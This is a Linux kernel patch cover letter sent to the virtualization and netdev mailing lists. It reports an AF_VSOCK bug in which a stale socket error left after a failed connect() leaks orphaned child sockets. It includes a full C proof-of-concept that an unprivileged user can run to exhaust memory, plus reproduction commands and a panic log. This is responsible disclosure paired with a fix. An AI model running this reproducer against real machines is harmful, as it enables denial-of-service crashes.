Received: from mail-pg1-f180.google.com (mail-pg1-f180.google.com [209.85.215.180])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id EC627486B8E
	for <virtualization@lists.linux.dev>; Thu, 23 Jul 2026 17:21:29 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.180
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1784827291; cv=none; b=U1pX8tHQl/zjk9+HIkMCCsn32Ot5aKKwjGSv9ESDEENfXilnxz7ljCHxIXcivSQGwPeolk6H3xVdpsi93N4lOoWzY9eRQ5TnfP/omOIHy5tFJxkLdR4KjFK9VWO93rufaK+3ngUP1qFTyoha5T7IlPgn08VQ8ST+Epq571wqmtU=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1784827291; c=relaxed/simple;
	bh=CPaPN5Ltve6dkBBzmVK3VDQ2/gA1iJ2rgNGbjdbDHuI=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=FVH3RNITIkYF8JTrRsTJa5M31UwkhEzeya9oYdKyho36kSiHyc27ZDRe5Cppdh+imb4RiBoHWmPUDNmYfnieaOu//K0ikCdnLfCqFt/JufcHJN0OR1chNs6qDG1Cp65tYKw3Iv6k7OEfUWrSwwtbAIHMHM/ZOx+mobAIKnYqVwI=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=pfxOONb1; arc=none smtp.client-ip=209.85.215.180
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="pfxOONb1"
Received: by mail-pg1-f180.google.com with SMTP id 41be03b00d2f7-c9ef3e1337fso663723a12.2
        for <virtualization@lists.linux.dev>; Thu, 23 Jul 2026 10:21:29 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1784827289; x=1785432089; darn=lists.linux.dev;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=FJRZN8SJ5nXWhc05c901fZkUoc3+I8GmqkqMc4MH/UQ=;
        b=pfxOONb1U/5h/1yxm+3H0Jpgc48tgnd9NTmkdSLVrfQpnFvZXM5crxRzuCHASzEW4c
         lY98kI+qDdcErcrbgYxrcSjtDKcq31GxwZfiCE5BP2hP00/4Dekxjr4q2AaepDXgUSS4
         KoHAExzUDIlQELbS/Dnl9ErC1vd8FOMLBmUtf46bjPZH2G/2lZ1TgPzNPxe8uK+pAUPQ
         ed7ahhMMT8xniP5UT3LVgtPBGWGh9cMHDLwoP17lLi5e5ZRhlVR2004f7RQdpWLlXa0v
         DHNY7EaPOlBoQp4ta5b4Tv/zOEm7TF3ZAmbjHjBSOZ4b8pquj00ODRePyNEGwcx25sM3
         ONOQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1784827289; x=1785432089;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=FJRZN8SJ5nXWhc05c901fZkUoc3+I8GmqkqMc4MH/UQ=;
        b=O2eb9/0eo/ER1+T/FWeo+97QfbdWPQ+FdHQnmIiw3TRTy5hf1N0Vn8ufS2U5aDDYKJ
         O7dKkV/p2skONL++SWjYJvyND7AqBqtm5sijp6yQWBXxMvQFz0To7vz+SahjQomzDMyX
         ITcIvohjHqRPZLr9g2VPVkvtVF90UWC7tf7lfnsJK6oYFCoMQ7162nsElFuo1YDR658+
         tNs0prI6S1XK2dxcbK83phBlJDxrmBaj2fEq1vhtCB/kW381nrZ09Ex0+PYVnV+3dt+1
         x2frc4T2PWj5AIGakbfAp2drsdFUxw36f8UKTGo3e9NlGPS+o1RpBjIEQcmJL7xFr7Tv
         eBEg==
X-Gm-Message-State: AOJu0YwoKYG6KY2pze9/7L1F1LRv7jwh0jY0p0h24nLNt8ylPFTL474s
	hO3a8xaoqD1OFxiYt+3WvtRVG2C/B/qD2sPuUnEVg9Ymkti7FeWQph87CCQcOXVqVRg=
X-Gm-Gg: AR+sD13r8IyJEMzoDazrKxFj2KZEXlYHSzPsrWtcK7Ltq5qZWxSIrqgJ84gW7neFuNN
	uHaaHt8H4lScG+G0v2vfyhQXDv9x9tt4aH1c/LpEAirbO82JADYMgJCZgF4k0UXJi6lISFwNU/R
	jNe+NjrGSCwLMy+QoEFsTMmoU96Nf62VRbFE6Btikn9r2IZmI7ajSbc9Y/cZmky7bllPj5bzC3U
	QIsezoHlQnGKb8Ku3WvesukFY9SzTYBl4WLt3+D2ij4hkA/gCLIXJfMfwG27oRiZRf4ZpPlosDd
	nHVr3ogTd8R6dkCAUjDGRCfu7whZIu2z8nWfF9dXu20+/kXadrHNtyUInwyWdLlXaEqWgbptG1Q
	a31FnY7/hdrYMJ9Yy0znxvrLgYF0g+pJkvtp5TA9ss9YFG2yQRgyTXXveyYgt30U9I8goPV0Iq3
	NRiQPg+xGuJJ++RV4nrFw=
X-Received: by 2002:a05:6a20:4387:b0:3bf:6c05:ab with SMTP id adf61e73a8af0-3c44b21f1e1mr4509184637.58.1784827289138;
        Thu, 23 Jul 2026 10:21:29 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([167.71.204.91])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-3147df09a9dsm20967373eec.19.2026.07.23.10.21.18
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 23 Jul 2026 10:21:28 -0700 (PDT)
From: Ren Wei <enjou1224z@gmail.com>
To: virtualization@lists.linux.dev,
	netdev@vger.kernel.org
Cc: sgarzare@redhat.com,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	dtor@vmware.com,
	georgezhang@vmware.com,
	acking@vmware.com,
	vega@nebusec.ai,
	zihanx@nebusec.ai,
	enjou1224z@gmail.com
Subject: [PATCH net 0/1] vsock: clear stale sk_err before listen()
Date: Fri, 24 Jul 2026 01:21:13 +0800
Message-ID: <cover.1784649300.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: virtualization@lists.linux.dev
List-Id: <virtualization.lists.linux.dev>
List-Subscribe: <mailto:virtualization+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:virtualization+unsubscribe@lists.linux.dev>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zihan Xi <zihanx@nebusec.ai>

Hi Linux kernel maintainers,

We found and validated an issue in net/vmw_vsock/af_vsock.c. The bug is
reachable by an unprivileged local user via AF_VSOCK loopback. We've
tested it, and it should not affect any other functionality.

This series contains one patch:
  1/1 vsock: clear stale sk_err before listen()

We provide bug details, reproducer steps, and a crash log below.

---- details below ----

Bug details:

A failed loopback connect() can leave sk_err set on a reusable AF_VSOCK
socket. If userspace then calls listen() on the same socket, the stale
error remains attached to the listener. A later child can still reach the
accept queue, but vsock_accept() sees listener->sk_err, rejects the
child, and drops only the transient accept reference.

On the virtio loopback path that rejected child can remain orphaned in the
vsock tables, so repeated iterations leak children and can eventually
push the guest into OOM. Clearing sk_err in vsock_listen() prevents a
failed connect() attempt from poisoning the next listener incarnation of
that socket.

On our fixed-kernel validation, the same minimal reproducer no longer hit
that failed accept path and accept() returned a valid child socket.

Reproducer:

    cc -O2 -Wall -Wextra -pthread -o /root/poc /root/poc.c
    echo 2 > /proc/sys/vm/panic_on_oom
    echo 1 > /proc/sys/vm/oom_dump_tasks
    /root/poc 100 44000 54000 33554432 33554432 600

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/vm_sockets.h>
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#define DEFAULT_BASE_PORT 40000U
#define DEFAULT_FAIL_PORT 50000U
#define DEFAULT_BUFFER_SIZE (32ULL * 1024 * 1024)
#define DEFAULT_SEND_BYTES (32ULL * 1024 * 1024)
#define DEFAULT_ITERATIONS 1U

struct client_ctx {
	pthread_mutex_t lock;
	pthread_cond_t cond;
	unsigned int server_port;
	unsigned int client_port;
	unsigned long long send_bytes;
	unsigned long long bytes_sent;
	int connect_errno;
	int send_errno;
	int sent_any;
	int connected;
	int done;
	int fd;
};

static void die(const char *msg)
{
	perror(msg);
	exit(EXIT_FAILURE);
}

static void set_vsock_u64(int fd, int optname, unsigned long long val)
{
	if (setsockopt(fd, AF_VSOCK, optname, &val, sizeof(val)) < 0)
		die("setsockopt(AF_VSOCK)");
}

static void set_connect_timeout(int fd, long sec)
{
	struct timeval tv = {
		.tv_sec = sec,
		.tv_usec = 0,
	};

	if (setsockopt(fd, AF_VSOCK, SO_VM_SOCKETS_CONNECT_TIMEOUT,
		       &tv, sizeof(tv)) < 0) {
		die("setsockopt(SO_VM_SOCKETS_CONNECT_TIMEOUT)");
	}
}

static void bind_vsock(int fd, unsigned int cid, unsigned int port)
{
	struct sockaddr_vm svm = {
		.svm_family = AF_VSOCK,
		.svm_cid = cid,
		.svm_port = port,
	};

	if (bind(fd, (struct sockaddr *)&svm, sizeof(svm)) < 0)
		die("bind(AF_VSOCK)");
}

static int connect_vsock_errno(int fd, unsigned int cid, unsigned int port)
{
	struct sockaddr_vm svm = {
		.svm_family = AF_VSOCK,
		.svm_cid = cid,
		.svm_port = port,
	};

	if (connect(fd, (struct sockaddr *)&svm, sizeof(svm)) == 0)
		return 0;

	return errno;
}

static void *client_thread(void *arg)
{
	struct client_ctx *ctx = arg;
	char *buf;
	unsigned long long sent = 0;
	const size_t chunk = 64 * 1024;
	int fd;
	int err;

	fd = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (fd < 0)
		die("client socket(AF_VSOCK)");

	set_vsock_u64(fd, SO_VM_SOCKETS_BUFFER_MAX_SIZE, ctx->send_bytes);
	set_vsock_u64(fd, SO_VM_SOCKETS_BUFFER_SIZE, ctx->send_bytes);
	bind_vsock(fd, VMADDR_CID_LOCAL, ctx->client_port);

	err = connect_vsock_errno(fd, VMADDR_CID_LOCAL, ctx->server_port);

	pthread_mutex_lock(&ctx->lock);
	ctx->fd = fd;
	ctx->connect_errno = err;
	ctx->connected = (err == 0);
	pthread_cond_broadcast(&ctx->cond);
	pthread_mutex_unlock(&ctx->lock);

	if (err)
		return NULL;

	buf = malloc(chunk);
	if (!buf)
		die("malloc");
	memset(buf, 'A', chunk);

	while (sent < ctx->send_bytes) {
		size_t todo = chunk;
		ssize_t rc;

		if (ctx->send_bytes - sent < todo)
			todo = ctx->send_bytes - sent;

		rc = send(fd, buf, todo, 0);
		if (rc < 0) {
			pthread_mutex_lock(&ctx->lock);
			ctx->send_errno = errno;
			pthread_mutex_unlock(&ctx->lock);
			break;
		}

		if (rc == 0)
			break;

		sent += rc;
		pthread_mutex_lock(&ctx->lock);
		ctx->sent_any = 1;
		ctx->bytes_sent = sent;
		pthread_cond_broadcast(&ctx->cond);
		pthread_mutex_unlock(&ctx->lock);
	}

	free(buf);

	pthread_mutex_lock(&ctx->lock);
	ctx->done = 1;
	pthread_cond_broadcast(&ctx->cond);
	pthread_mutex_unlock(&ctx->lock);

	return NULL;
}

static void client_ctx_init(struct client_ctx *ctx, unsigned int server_port,
			    unsigned int client_port,
			    unsigned long long send_bytes)
{
	memset(ctx, 0, sizeof(*ctx));
	pthread_mutex_init(&ctx->lock, NULL);
	pthread_cond_init(&ctx->cond, NULL);
	ctx->server_port = server_port;
	ctx->client_port = client_port;
	ctx->send_bytes = send_bytes;
	ctx->fd = -1;
}

static void client_ctx_destroy(struct client_ctx *ctx)
{
	pthread_mutex_destroy(&ctx->lock);
	pthread_cond_destroy(&ctx->cond);
}

static int wait_for_connect(struct client_ctx *ctx)
{
	int err;

	pthread_mutex_lock(&ctx->lock);
	while (!ctx->connected && ctx->connect_errno == 0)
		pthread_cond_wait(&ctx->cond, &ctx->lock);
	err = ctx->connect_errno;
	pthread_mutex_unlock(&ctx->lock);

	return err;
}

static void wait_for_send_progress(struct client_ctx *ctx)
{
	struct timespec ts;

	clock_gettime(CLOCK_REALTIME, &ts);
	ts.tv_sec += 2;
	if (ts.tv_nsec >= 1000000000L) {
		ts.tv_sec += 1;
		ts.tv_nsec -= 1000000000L;
	}

	pthread_mutex_lock(&ctx->lock);
	if (!ctx->done)
		pthread_cond_timedwait(&ctx->cond, &ctx->lock, &ts);
	pthread_mutex_unlock(&ctx->lock);
}

static int prepare_listener(unsigned int server_port, unsigned int fail_port,
			    unsigned long long buffer_size)
{
	int fd;
	int err;

	fd = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (fd < 0)
		die("listener socket(AF_VSOCK)");

	set_connect_timeout(fd, 1);
	set_vsock_u64(fd, SO_VM_SOCKETS_BUFFER_MAX_SIZE, buffer_size);
	set_vsock_u64(fd, SO_VM_SOCKETS_BUFFER_SIZE, buffer_size);
	bind_vsock(fd, VMADDR_CID_LOCAL, server_port);

	err = connect_vsock_errno(fd, VMADDR_CID_LOCAL, fail_port);
	if (err == 0) {
		fprintf(stderr, "unexpected successful failed-connect setup on port %u\n",
			fail_port);
		exit(EXIT_FAILURE);
	}

	fprintf(stderr, "[*] setup connect() failed with errno=%d (%s)\n",
		err, strerror(err));

	if (listen(fd, 1) < 0)
		die("listen(AF_VSOCK)");

	return fd;
}

static int trigger_once(unsigned int server_port, unsigned int fail_port,
			unsigned int client_port,
			unsigned long long buffer_size,
			unsigned long long send_bytes)
{
	struct client_ctx ctx;
	pthread_t tid;
	int listener_fd;
	int accept_fd;
	int accept_errno;

	listener_fd = prepare_listener(server_port, fail_port, buffer_size);

	client_ctx_init(&ctx, server_port, client_port, send_bytes);
	if (pthread_create(&tid, NULL, client_thread, &ctx) != 0)
		die("pthread_create");

	if (wait_for_connect(&ctx) != 0) {
		fprintf(stderr, "client connect failed with errno=%d (%s)\n",
			ctx.connect_errno, strerror(ctx.connect_errno));
		exit(EXIT_FAILURE);
	}

	wait_for_send_progress(&ctx);

	accept_fd = accept(listener_fd, NULL, NULL);
	accept_errno = errno;

	fprintf(stderr, "[*] accept() returned fd=%d errno=%d (%s)\n",
		accept_fd, accept_errno, strerror(accept_errno));

	if (accept_fd >= 0) {
		fprintf(stderr, "unexpected successful accept()\n");
		exit(EXIT_FAILURE);
	}

	if (accept_errno != ECONNRESET) {
		fprintf(stderr, "unexpected accept errno: %d (%s)\n",
			accept_errno, strerror(accept_errno));
		exit(EXIT_FAILURE);
	}

	close(listener_fd);

	pthread_join(tid, NULL);

	fprintf(stderr,
		"[*] client connect errno=%d send errno=%d bytes_sent=%llu sent_any=%d done=%d\n",
		ctx.connect_errno, ctx.send_errno, ctx.bytes_sent,
		ctx.sent_any, ctx.done);
	accept_fd = ctx.fd;
	ctx.fd = -1;
	client_ctx_destroy(&ctx);
	return accept_fd;
}

static unsigned int parse_u32(const char *s)
{
	unsigned long long v = strtoull(s, NULL, 0);

	if (v > UINT32_MAX) {
		fprintf(stderr, "value too large: %s\n", s);
		exit(EXIT_FAILURE);
	}

	return (unsigned int)v;
}

static unsigned long long parse_u64(const char *s)
{
	return strtoull(s, NULL, 0);
}

int main(int argc, char **argv)
{
	unsigned int iterations = DEFAULT_ITERATIONS;
	unsigned int base_port = DEFAULT_BASE_PORT;
	unsigned int fail_base = DEFAULT_FAIL_PORT;
	unsigned long long buffer_size = DEFAULT_BUFFER_SIZE;
	unsigned long long send_bytes = DEFAULT_SEND_BYTES;
	unsigned int hold_seconds = 0;
	int *held_fds;
	unsigned int i;

	signal(SIGPIPE, SIG_IGN);

	if (argc > 1)
		iterations = parse_u32(argv[1]);
	if (argc > 2)
		base_port = parse_u32(argv[2]);
	if (argc > 3)
		fail_base = parse_u32(argv[3]);
	if (argc > 4)
		buffer_size = parse_u64(argv[4]);
	if (argc > 5)
		send_bytes = parse_u64(argv[5]);
	if (argc > 6)
		hold_seconds = parse_u32(argv[6]);

	held_fds = calloc(iterations, sizeof(*held_fds));
	if (!held_fds)
		die("calloc");

	for (i = 0; i < iterations; i++)
		held_fds[i] = -1;

	fprintf(stderr,
		"[*] iterations=%u base_port=%u fail_base=%u buffer_size=%llu send_bytes=%llu hold_seconds=%u\n",
		iterations, base_port, fail_base, buffer_size, send_bytes,
		hold_seconds);

	for (i = 0; i < iterations; i++) {
		unsigned int server_port = base_port + (i * 2);
		unsigned int client_port = base_port + (i * 2) + 1;
		unsigned int fail_port = fail_base + i;

		fprintf(stderr,
			"[*] iteration=%u server_port=%u client_port=%u fail_port=%u\n",
			i, server_port, client_port, fail_port);
		held_fds[i] = trigger_once(server_port, fail_port, client_port,
					   buffer_size, send_bytes);
		fprintf(stderr, "[*] holding client fd=%d\n", held_fds[i]);
	}

	if (hold_seconds) {
		fprintf(stderr, "[*] sleeping for %u seconds with client sockets open\n",
			hold_seconds);
		sleep(hold_seconds);
	}

	for (i = 0; i < iterations; i++) {
		if (held_fds[i] >= 0)
			close(held_fds[i]);
	}

	free(held_fds);

	return 0;
}

------END poc.c--------

----BEGIN crash log----

[  921.941962][T10458] Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled
[  921.942839][T10458] CPU: 0 UID: 0 PID: 10458 Comm: poc Not tainted 6.12.74 #3
[  921.943455][T10458] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  921.944405][T10458] Call Trace:
[  921.944701][T10458]  <TASK>
[  921.944974][T10458]  dump_stack_lvl+0x3b/0x1f0
[  921.945423][T10458]  panic+0x6fe/0x7e0
[  921.945802][T10458]  ? dump_header+0x6c2/0x950
[  921.946233][T10458]  ? __pfx_panic+0x10/0x10
[  921.947686][T10458]  ? out_of_memory+0x8c5/0x16b0
[  921.948137][T10458]  out_of_memory+0x8f3/0x16b0
[  921.949926][T10458]  __alloc_pages_noprof+0x1ec3/0x26d0
[  921.954378][T10458]  alloc_pages_mpol_noprof+0x2ce/0x610
[  921.956796][T10458]  folio_alloc_noprof+0x23/0xd0
[  921.957720][T10458]  filemap_alloc_folio_noprof+0x35d/0x420
[  921.959719][T10458]  filemap_fault+0x675/0x2800
[  921.962920][T10458]  do_pte_missing+0x174c/0x3ff0
[  921.964830][T10458]  __handle_mm_fault+0xfa3/0x2a10
[  921.967730][T10458]  handle_mm_fault+0x3f5/0xa00
[  921.968200][T10458]  do_user_addr_fault+0x50a/0x1490
[  921.968691][T10458]  exc_page_fault+0x5d/0xe0
[  921.969113][T10458]  asm_exc_page_fault+0x26/0x30
[  921.969561][T10458] RIP: 0033:0x7f47a09b2237
[  921.969990][T10458] Code: Unable to access opcode bytes at 0x7f47a09b220d.
[  921.970550][T10458] RSP: 002b:00007f47a089be60 EFLAGS: 00010202
[  921.971073][T10458] RAX: 0000000000010000 RBX: 00007ffe78934c80 RCX: 00007f47a0942c8e
[  921.972372][T10458] RDX: 000000000000002c RSI: 0000000000000000 RDI: 0000000000000016
[  921.973017][T10458] RBP: 0000000001800000 R08: 0000000000000000 R09: 0000000000000000
[  921.974428][T10458]  </TASK>
[  921.974959][T10458] Kernel Offset: disabled
[  921.975445][T10458] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zihan Xi

Zihan Xi (1):
  vsock: clear stale sk_err before listen()

 net/vmw_vsock/af_vsock.c | 4 ++++
 1 file changed, 4 insertions(+)

-- 
2.43.0
